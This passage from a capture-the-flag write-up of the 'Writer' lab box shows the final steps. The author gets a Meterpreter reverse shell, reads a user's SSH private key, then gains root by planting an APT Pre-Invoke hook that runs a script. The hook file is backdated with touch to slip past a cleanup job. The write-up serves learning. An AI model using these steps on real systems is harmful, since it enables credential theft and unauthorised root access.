And then we have a Meterpreter session:
```Awk
msf6 exploit(multi/handler) >
[*] Sending stage (3012548 bytes) to 10.10.11.101
se[*] Meterpreter session 2 opened (10.10.10.10:4646 -> 10.10.11.101:34270 ) at 2021-12-11 09:16:54 -0500                                                                                                        ssions

Active sessions                                                                                                                                                                                                  ===============

  Id  Name  Type                   Information          Connection
  --  ----  ----                   -----------          ----------
  2         meterpreter x64/linux  john @ 10.10.11.101  10.10.10.10:4646 -> 10.10.11.101:34270  (10.10.11.101)
```

Using this, we can grab john's private SSH key:
```Awk
msf6 exploit(multi/handler) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > shell
Process 377516 created.
Channel 1 created.
cat /home/john/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----

-----END OPENSSH PRIVATE KEY-----
exit
meterpreter > bg
[*] Backgrounding session 2...
```

We can then put this in a file and SSH in as john using it:
```Awk
└─# vi john_id_rsa

└─# chmod 600 john_id_rsa

└─# ssh john@writer.htb -i john_id_rsa
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)
john@writer:~$
```

### John Enumeration

Now, we finally can try to escalate to root.  Inspecting processes with pspy64 you can see that periodically, the box is running `apt-get update`:
```Awk
2021/12/11 14:30:01 CMD: UID=0    PID=378422 | /bin/sh -c /usr/bin/apt-get update
2021/12/11 14:30:01 CMD: UID=0    PID=378421 | /usr/bin/cp -r /root/.scripts/writer2_project /var/www/
2021/12/11 14:30:01 CMD: UID=0    PID=378420 | /usr/bin/find /etc/apt/apt.conf.d/ -mtime -1 -exec rm {} ;
2021/12/11 14:30:01 CMD: UID=???  PID=378419 | ???
2021/12/11 14:30:01 CMD: UID=0    PID=378423 | /usr/bin/find /etc/apt/apt.conf.d/ -mtime -1 -exec rm {} ;
2021/12/11 14:30:01 CMD: UID=0    PID=378424 | /usr/bin/dpkg --print-foreign-architectures
2021/12/11 14:30:01 CMD: UID=0    PID=378425 | /usr/lib/apt/methods/http
2021/12/11 14:30:01 CMD: UID=0    PID=378426 | /usr/bin/apt-get update
2021/12/11 14:30:02 CMD: UID=33   PID=378427 | python3 manage.py runserver 127.0.0.1:8080
```

In addition, it is also removing all apt configuration files with a modification time of a day.  I guess this is supposed to prevent us from adding in our own configuration file to do what we want.  Looking at the groups john is a member of, we see we are also in the `management` group:
```Awk
john@writer:~$ cat /etc/group | grep john
john:x:1001:
management:x:1003:john
```

Let's look at the apt configuration directory:
```Awk
john@writer:~$ ls -al /etc/apt/apt.conf.d
total 48
drwxrwxr-x 2 root management 4096 Dec 11 14:29 .
drwxr-xr-x 7 root root       4096 Jul  9 10:59 ..
-rw-r--r-- 1 root root        630 Apr  9  2020 01autoremove
-rw-r--r-- 1 root root         92 Apr  9  2020 01-vendor-ubuntu
-rw-r--r-- 1 root root        129 Dec  4  2020 10periodic
-rw-r--r-- 1 root root        108 Dec  4  2020 15update-stamp
-rw-r--r-- 1 root root         85 Dec  4  2020 20archive
-rw-r--r-- 1 root root       1040 Sep 23  2020 20packagekit
-rw-r--r-- 1 root root        114 Nov 19  2020 20snapd.conf
-rw-r--r-- 1 root root        625 Oct  7  2019 50command-not-found
-rw-r--r-- 1 root root        182 Aug  3  2019 70debconf
-rw-r--r-- 1 root root        305 Dec  4  2020 99update-notifier
```

It looks like we cannot remove the files in the directory, but we can add our own files. 

### Gaining Root

So after some quick research, we can create a file with the following contents to execute our script to give as another Meterpreter session as root:
```Awk
john@writer:/etc/apt/apt.conf.d$ cat 02Update
APT::Update::Pre-Invoke {"/tmp/.tempdir/script.sh"};
```

That seems simple enough, but we also need to bypass the removal script.  This can be done by changing the modify time to more than a day ago:
```Awk
john@writer:/etc/apt/apt.conf.d$ touch -d "29 hours ago" 02Update
```

And now we wait for a shell:
```Awk
msf6 exploit(multi/handler) >
[*] Sending stage (3012548 bytes) to 10.10.11.101
[*] Meterpreter session 3 opened (10.10.10.10:4646 -> 10.10.11.101:34762 ) at 2021-12-11 09:28:13 -0500
sessions

Active sessions
===============

  Id  Name  Type                   Information          Connection
  --  ----  ----                   -----------          ----------
  2         meterpreter x64/linux  john @ 10.10.11.101  10.10.10.10:4646 -> 10.10.11.101:34270  (10.10.11.101)
  3         meterpreter x64/linux  root @ 10.10.11.101  10.10.10.10:4646 -> 10.10.11.101:34762  (10.10.11.101)
```

Now we have a shell as root!

From here we can get the root.txt and whatever else we want:
```Awk
msf6 exploit(multi/handler) > sessions -i 3
[*] Starting interaction with 3...

meterpreter > shell
Process 378346 created.
Channel 1 created.
cd
cat root.txt
<HASH>
```

## Conclusion

I had a lot of fun getting this box, although the initial foothold was very frustrating for me.  Having read different writeups of this box, there are multiple paths you can take to get a shell, and I probably went down one of the hardest paths, but I recommend watching [IppSec's video here](https://www.youtube.com/watch?v=MkvDid7xO7o) as he highlights all of the different avenues well, and he also goes over the proper way to do the SQL injection.  SQL injection is definitely an area where I need to improve, and this box definitely taught me a lot about it.